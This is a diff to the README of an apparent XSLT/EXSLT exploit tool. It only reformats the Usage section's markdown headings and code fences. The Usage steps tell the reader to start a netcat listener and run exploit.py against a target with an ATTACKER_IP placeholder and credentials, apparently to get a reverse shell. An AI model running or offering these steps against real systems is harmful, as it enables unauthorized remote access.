@@ -48,10 +48,12 @@ The XSLT payload uses EXSLT file-write capabilities to drop a Python script on t
 
 ## ▶️ Usage
 
-### 1️⃣ Start a Netcat listener
+### **1️⃣ Start a Netcat listener**
 ```bash
 nc -lvnp <PORT>
+````
 
-### **2️⃣ Run the exploit
-
+### **2️⃣ Run the exploit**
+```
 python3 exploit.py --ip <ATTACKER_IP>  --puerto <PORT> --username <USERNAME> --password <PASSWORD>
+```
